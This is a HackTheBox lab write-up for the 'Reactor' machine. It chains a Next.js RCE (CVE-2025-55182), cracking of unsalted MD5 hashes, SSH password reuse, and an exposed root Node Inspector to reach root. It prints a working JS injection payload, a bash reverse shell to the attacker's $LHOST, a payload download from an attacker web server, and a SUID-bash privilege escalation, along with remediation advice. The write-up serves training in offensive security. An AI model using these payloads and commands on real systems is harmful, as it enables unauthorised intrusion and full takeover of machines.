# Reactor - HackTheBox Writeup

## Overview
- **Machine:** Reactor
- **OS:** Linux (Ubuntu 24.04)
- **Difficulty:** Easy
- **IP:** 10.129.89.203
- **Date Completed:** 2026-09-05

Reactor runs a Next.js web app (v15.0.3) vulnerable to a server-side JS injection RCE (CVE-2025-55182), which drops a shell as the `node` service account. From there, the app's SQLite database yields unsalted MD5 password hashes; cracking `engineer`'s hash and reusing it gives SSH access and the user flag. Root comes from a root-owned Node.js process left running with the debug Inspector enabled on loopback — tunnelled out over SSH and driven with Chrome DevTools to execute code as root and SUID `/bin/bash`.

```
Next.js RCE (CVE-2025-55182)  →  code exec as node
      │
      ▼
reactor.db  →  crack unsalted MD5  →  engineer's password
      │   (password reuse)
      ▼
engineer  →  user.txt
      │   pspy: root process  node --inspect=127.0.0.1:9229
      ▼
exposed Node Inspector (root)  →  SUID /bin/bash  →  root.txt
```

> ⚠️ **Live box:** cracked passwords and flag values are intentionally redacted throughout.
> `$LHOST` = your VPN IP (`ip a show tun0`), used in place of the raw address.

## Skills Learned
- Exploiting a server-side JavaScript injection / RCE (CVE-2025-55182) in Next.js
- Reaching `require` from a restricted global context via `process.mainModule.require(...)`
- Looting a SQLite application database and understanding weak password storage (unsalted MD5)
- Lateral movement through password reuse (app hash → system account)
- Linux process monitoring for privesc paths with `pspy`
- Recognising and abusing an exposed, unauthenticated Node.js Inspector
- SSH local port forwarding to reach a loopback-bound service
- SUID privilege escalation
- Comfort with the core Kali toolset: Nmap, Nikto, pspy, tcpdump

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sT -p- 10.129.89.203
sudo nmap -sV -sU 10.129.89.203
```

Key finding: a web application on **port 3000** — the default **Next.js** port.

### Enumeration

```bash
nikto -h http://10.129.89.203:3000
```

- **Wappalyzer** fingerprinted the stack as **Next.js v15.0.3** — a version with a known, exploitable RCE.
- Nikto leaked a reference to the **Alibaba Cloud metadata endpoint** (`100.100.100.200`) — noted, but ultimately a rabbit hole for the intended path.

## Foothold

**Vulnerability:** server-side JavaScript injection / RCE in Next.js v15.0.3 — **CVE-2025-55182**.

- **PoC:** https://github.com/pkrasulia/CVE-2025-55182-NextJS-RCE-PoC

The exploit injects a JS payload that is evaluated on the server, giving arbitrary command execution in the Node.js process context:

```js
(function(){
    try {
        var res = process.mainModule.require("child_process").execSync("<CMD>").toString();
        console.log("\n[+] RCE RESULT:\n" + res);
        throw new Error("[+] RCE SUCCESS: " + res);
    } catch(e) {
        console.log(e);
        throw e;
    }
})()
```

> **Note:** `require` isn't available directly in the injected (global) context, so the payload reaches it via **`process.mainModule.require(...)`**. This same trick reappears in the root step.

**Runner fix** — the PoC initially failed on the attacker box with `Promise.withResolvers is not a function` (that method was only added in Node.js v22; Kali shipped an older Node). Upgrade Node:

```bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
source ~/.bashrc && nvm install 22 && nvm use 22
```

**Confirm RCE** with an ICMP callback:

```bash
sudo tcpdump -i tun0 icmp                                    # attacker – listen
node exploit.js http://10.129.89.203:3000 "ping -c 3 $LHOST" # fire a ping
```

```
10:20:02 IP 10.129.89.203 > $LHOST: ICMP echo request  ← RCE confirmed
```

**Reverse shell:**

```bash
nc -lvnp 4444        # attacker
node exploit.js http://10.129.89.203:3000 'bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"'
```

> **Note:** the `bash -c "..."` wrapper is essential — `execSync` runs under `/bin/sh` (dash on Ubuntu), which doesn't understand `>&` or `/dev/tcp`, so the payload has to be handed explicitly to `bash`.

Landed as **`node@reactor`**. Stabilise the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

### Loot — App Database & Credentials

```bash
node@reactor:~$ find / -iname '*reactor*' 2>/dev/null
/opt/reactor-app/reactor.db

node@reactor:/opt/reactor-app$ sqlite3 reactor.db "SELECT username,password_hash,role,email FROM users;"
admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

32 hex chars = **raw MD5, unsalted**. Because they're unsalted, an online reverse-lookup (**CrackStation**) returns the plaintext instantly — the values were precomputed. This is exactly why real apps use salted, slow hashes (bcrypt/scrypt/Argon2).

The cracked password for `engineer` was reused for the system account:

```bash
ssh engineer@10.129.89.203        # cracked password

engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)

engineer@reactor:~$ cat ~/user.txt   # 🏁 user.txt
```

## Privilege Escalation

### Enumeration for PrivEsc

Standard local checks first — all dead ends:

```bash
sudo -l                                     # nothing useful
find / -perm -4000 -type f 2>/dev/null      # all default SUIDs
getcap -r / 2>/dev/null                     # all default caps
```

**Rabbit holes (documented so you don't repeat them):**

- **`lxd` group (101)** — normally instant root, but this is Ubuntu 24.04 where `lxc` is the `lxd-installer` shim that runs `snap install lxd` on demand, and the box has **no internet** (`snap list` shows none installed). Side-loading a snap needs root, so the group is a decoy.
- **Alibaba cloud metadata (`100.100.100.200`)** — the ECS metadata endpoint was reachable and looked promising (RAM STS creds / `user-data`), but did not lead to root on this path.

**The real vector — process monitoring with `pspy`.** The box has no internet but reaches Kali over the VPN:

```bash
# Kali
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 8000
# Target
cd /dev/shm && wget http://$LHOST:8000/pspy64 && chmod +x pspy64
./pspy64 -i 1000 | grep --line-buffered 'UID=0'
```

Standout root process:

```
UID=0  PID=1397  | /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A **root Node.js process with the debug Inspector enabled** on `127.0.0.1:9229` — a full debugger, so connecting gives arbitrary code execution inside a root process.

### Exploitation

```bash
curl -s http://127.0.0.1:9229/json
# → "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<uuid>", Node v20
```

**Why an SSH tunnel?** The process was started as `node --inspect=`**`127.0.0.1`**`:9229` — bound to the box's **loopback interface only**. It accepts `localhost` connections *on the box* and is deliberately not exposed to the network, so a scan from Kali against 9229 finds nothing and DevTools can't reach `10.129.89.203:9229`. That loopback bind is the one thing stopping an unauthenticated debugger from being trivially abused remotely.

An SSH tunnel defeats that cleanly. As `engineer` we already have valid SSH creds (password reuse), so `ssh -L` forwards Kali's `127.0.0.1:9229` through the encrypted channel to the box's `127.0.0.1:9229`. The Inspector still sees a loopback connection — what it wants — while DevTools just talks to its own localhost.

**1. SSH tunnel** — forward the box's loopback 9229 to Kali (keep this session open):

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.89.203
curl -s http://127.0.0.1:9229/json    # from Kali: returns the webSocketDebuggerUrl → tunnel is live
```

**2. Attach with Chrome DevTools** (Chromium-based browser required — Firefox can't attach to a Node inspector):

- Open `chrome://inspect`
- The target `/opt/uptime-monitor/worker.js` usually appears automatically under **Remote Target** (Chromium ships with `localhost:9229` in its default target list). If not, click **Configure…** and add `127.0.0.1:9229`.
- Click **inspect** to open a DevTools window attached to the root Node process.

**3. In the DevTools Console**, execute code in the root process to SUID bash:

```js
process.mainModule.require('child_process').execSync('chmod +s /bin/bash').toString()
```

> **Key detail:** inside the Console the context is global, where `require` is undefined. Reach it via **`process.mainModule.require(...)`** (same as the foothold payload). A successful run returns `''` (execSync returns empty).

**Root shell:**

```bash
engineer@reactor:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root ... /bin/bash        # SUID bit set

engineer@reactor:~$ /bin/bash -p
bash-5.2# id
uid=1000(engineer) gid=1000(engineer) euid=0(root) ...
bash-5.2# cat /root/root.txt                # 🏆 root.txt
```

## Flags
- **User Flag:** `redacted (live box)`
- **Root Flag:** `redacted (live box)`

## Lessons Learned / Notes
- `require` being undefined in an eval/global context isn't a dead end — `process.mainModule.require(...)` reaches it. The same trick unlocked both the foothold and the root step.
- A reverse shell using `>&` / `/dev/tcp` must be handed to `bash` explicitly (`bash -c "..."`), because `execSync` runs under dash, which lacks those features.
- A service bound to `127.0.0.1` isn't safe just because it's "localhost only" — with any valid account, SSH local forwarding puts you inside the loopback interface.
- Unsalted MD5 is effectively plaintext against precomputed lookups. Slow, salted KDFs (bcrypt/scrypt/Argon2) exist for exactly this.

**Remediation summary:**

| Issue | Fix |
|-------|-----|
| Server-side JS injection in Next.js | Never `eval`/execute user-controlled input; validate & sandbox; patch the framework. |
| Unsalted MD5 password storage | Use a slow, salted KDF (bcrypt/scrypt/Argon2). |
| Password reuse (DB hash → system account) | Unique, high-entropy passwords per account. |
| Node `--inspect` running as root | Never expose the Inspector in production; bind behind localhost with auth, never as root. |
| App/service running as root | Run services as a dedicated low-privilege user. |

## References
- [CVE-2025-55182 — Next.js RCE PoC](https://github.com/pkrasulia/CVE-2025-55182-NextJS-RCE-PoC)
- [pspy — process monitoring without root](https://github.com/DominicBreuker/pspy)
- [CrackStation — MD5 reverse lookup](https://crackstation.net/)
- [Node.js Inspector / debugging docs](https://nodejs.org/en/learn/getting-started/debugging)
